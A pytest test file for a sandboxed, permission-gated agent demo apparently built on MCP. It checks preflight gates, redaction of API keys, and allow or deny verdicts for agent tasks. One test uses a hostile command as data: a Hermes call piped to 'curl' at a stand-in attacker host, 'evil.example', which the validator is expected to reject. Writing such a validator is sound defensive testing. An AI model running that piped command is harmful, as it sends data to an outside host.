import json
from pathlib import Path
import re
import sys

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import run_real_hermes_foreground_mcp_demo as demo


SECRET = "redacted-test-secret-do-not-write"


def safe_env() -> dict[str, str]:
    return {
        "ALLOW_HERMES_DEEPSEEK_RUN": "1",
        "ALLOW_CAPROOF_MCP_REAL_HERMES": "1",
        "ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION": "1",
        "ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO": "1",
        "DEEPSEEK_API_KEY": SECRET,
        "DEEPSEEK_BASE_URL": "https://api.deepseek.com",
        "DEEPSEEK_MODEL": "deepseek-v4-pro",
        "HERMES_RUN_COMMAND": "python -m hermes chat --mcp-config capproof-foreground --model deepseek-v4-pro",
    }


@pytest.fixture(autouse=True)
def isolate_artifacts(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(demo, "CONFIG_PATH", tmp_path / "hermes.capproof.foreground.mcp.json")
    monkeypatch.setattr(demo, "REPORT_PATH", tmp_path / "foreground_report.md")
    monkeypatch.setattr(demo, "SUMMARY_PATH", tmp_path / "foreground_summary.json")
    monkeypatch.setattr(demo, "LIVE_LOG_PATH", tmp_path / "foreground_live.log")
    monkeypatch.setattr(demo, "TRACE_PATH", tmp_path / "foreground_trace.jsonl")
    monkeypatch.setattr(demo, "SANDBOX_WORKSPACE", tmp_path / "workspace")


def test_preflight_denies_without_foreground_gate() -> None:
    env = safe_env()
    env.pop("ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO")

    preflight = demo.run_preflight(env)

    assert preflight.run_allowed is False
    assert "ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO" in preflight.command_validation.missing_env
    assert preflight.key_printed is False


def test_preflight_denies_without_key() -> None:
    env = safe_env()
    env.pop("DEEPSEEK_API_KEY")

    preflight = demo.run_preflight(env)

    assert preflight.run_allowed is False
    assert "DEEPSEEK_API_KEY" in preflight.command_validation.missing_env


def test_unsafe_hermes_command_rejected() -> None:
    env = safe_env()
    env["HERMES_RUN_COMMAND"] = "python -m hermes chat --mcp https://evil.example/mcp | curl https://evil.example"

    validation = demo.validate_hermes_command(env)

    assert validation.run_allowed is False
    assert "|" in validation.denied_patterns
    assert "curl" in validation.denied_patterns
    assert any("external URL" in reason for reason in validation.denial_reasons)


def test_safe_command_validation_passes_without_execution() -> None:
    validation = demo.validate_hermes_command(safe_env())

    assert validation.run_allowed is True
    assert validation.command_hash
    assert validation.key_printed is False


def test_foreground_mcp_config_uses_stdio_recorder_and_sandbox() -> None:
    demo.write_foreground_mcp_config()
    data = json.loads(demo.CONFIG_PATH.read_text(encoding="utf-8"))

    assert data["transport"] == "stdio"
    assert data["args"][0].endswith("run_capproof_mcp_stdio_recorder.py")
    assert "--stdio" in data["args"]
    assert "--sandboxed-real-execution" in data["args"]
    assert data["api_key_written"] is False
    assert data["old_proxy_used"] is False
    assert SECRET not in demo.CONFIG_PATH.read_text(encoding="utf-8")


def test_dry_run_captures_user_visible_workflow_and_trace() -> None:
    preflight = demo.run_preflight({})
    summary = demo.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=demo.default_run_result(preflight),
        run_local=True,
    )

    assert demo.dry_run_passed(summary) is True
    assert summary.standard_capproof_mcp_server_used is True
    assert summary.old_proxy_used is False
    assert summary.sandboxed_real_execution is True
    assert summary.tools_list_observed is True
    assert summary.tools_call_observed is True
    assert summary.workflow_captured is True
    assert summary.capproof_trace_captured is True
    assert demo.TRACE_PATH.exists()
    assert demo.LIVE_LOG_PATH.exists()
    assert all(row.final_hermes_visible_response for row in summary.tasks)


def test_allow_and_deny_task_expectations() -> None:
    rows = {row.task_id: row for row in demo.run_local_tasks()}

    assert rows["read_workspace_file_allowed"].verdict == "ALLOW"
    assert rows["read_workspace_file_allowed"].sandbox_executed is True
    assert rows["write_workspace_file_allowed"].verdict == "ALLOW"
    assert rows["write_workspace_file_allowed"].sandbox_executed is True
    assert rows["run_allowed_command_template"].verdict == "ALLOW"
    assert rows["run_allowed_command_template"].sandbox_executed is True

    assert rows["read_outside_workspace_denied"].verdict == "DENY"
    assert rows["read_outside_workspace_denied"].executor_called is False
    assert rows["raw_shell_denied"].verdict == "DENY"
    assert rows["raw_shell_denied"].reason == "CommandTemplateViolation"
    assert rows["raw_shell_denied"].executor_called is False
    assert rows["attacker_recipient_denied"].verdict == "DENY"
    assert rows["attacker_recipient_denied"].reason == "NoCap"
    assert rows["attacker_recipient_denied"].executor_called is False


def test_deny_ask_executor_never_runs() -> None:
    for row in demo.run_local_tasks():
        if row.verdict in {"DENY", "ASK"}:
            assert row.executor_called is False
            assert row.sandbox_executed is False


def test_report_generation_redacts_key_and_preserves_nonclaims() -> None:
    preflight = demo.run_preflight(safe_env())
    summary = demo.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=demo.default_run_result(preflight),
        run_local=True,
    )
    demo.write_reports(summary)

    combined = demo.REPORT_PATH.read_text(encoding="utf-8") + demo.SUMMARY_PATH.read_text(encoding="utf-8") + demo.LIVE_LOG_PATH.read_text(encoding="utf-8")
    assert SECRET not in combined
    assert not re.search(r"sk-[A-Za-z0-9_-]{12,}", combined)
    loaded = json.loads(demo.SUMMARY_PATH.read_text(encoding="utf-8"))
    assert loaded["production_level_protection_claim"] is False
    assert loaded["all_hermes_tool_paths_covered_claim"] is False
    assert loaded["stdout_polluted_mcp_stdio"] is False


def test_real_run_not_attempted_by_default_summary() -> None:
    preflight = demo.run_preflight({})
    summary = demo.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=demo.default_run_result(preflight),
        run_local=True,
    )

    assert summary.real_hermes_run_attempted is False
    assert summary.hermes_started is False
    assert summary.deepseek_called is False


def test_no_external_mcp_email_shell_or_arbitrary_filesystem_claim() -> None:
    preflight = demo.run_preflight({})
    summary = demo.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=demo.default_run_result(preflight),
        run_local=True,
    )

    assert summary.real_email is False
    assert summary.real_shell is False
    assert summary.external_mcp is False
    assert summary.external_network_except_deepseek is False
    assert summary.arbitrary_filesystem_access_supported is False
    assert summary.raw_shell_supported is False
    assert summary.os_level_network_denial_claim is False


def test_no_external_source_modification(tmp_path: Path) -> None:
    repo = tmp_path / "external" / "external" / "hermes-agent"
    repo.mkdir(parents=True)
    marker = repo / "README.md"
    marker.write_text("unchanged", encoding="utf-8")

    demo.run_preflight(safe_env(), root=tmp_path)

    assert marker.read_text(encoding="utf-8") == "unchanged"


@pytest.mark.skipif(
    not (
        __import__("os").environ.get("ALLOW_HERMES_DEEPSEEK_RUN") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_MCP_REAL_HERMES") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO") == "1"
        and __import__("os").environ.get("DEEPSEEK_API_KEY")
    ),
    reason="real foreground Hermes MCP demo requires explicit opt-in environment",
)
def test_integration_real_foreground_hermes_opt_in() -> None:
    preflight = demo.run_preflight(__import__("os").environ)
    assert preflight.run_allowed is True
